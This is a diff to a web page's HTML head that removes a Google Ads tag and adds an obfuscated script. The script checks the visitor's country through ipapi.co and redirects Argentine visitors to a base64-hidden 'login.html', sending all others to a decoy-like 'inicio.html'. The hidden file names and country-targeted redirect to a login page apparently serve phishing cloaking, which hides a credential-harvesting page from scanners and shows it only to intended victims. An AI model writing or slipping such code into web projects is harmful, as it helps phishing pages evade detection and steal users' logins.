@@ -138,15 +138,26 @@
         }
     </style>
 
-    <!-- Google tag (SOLO CONFIG, SIN CONVERSIONES) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18088544449"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'AW-18088544449');
-    </script>
+   <script>
+(function(){
+  const URL_AR = atob("bG9naW4uaHRtbA==");
+  const URL_OUT = atob("aW5pY2lvLmh0bWw=");
 
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "AR") {
+        window.location.href = URL_AR;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
+    
 </head>
 
 <body>
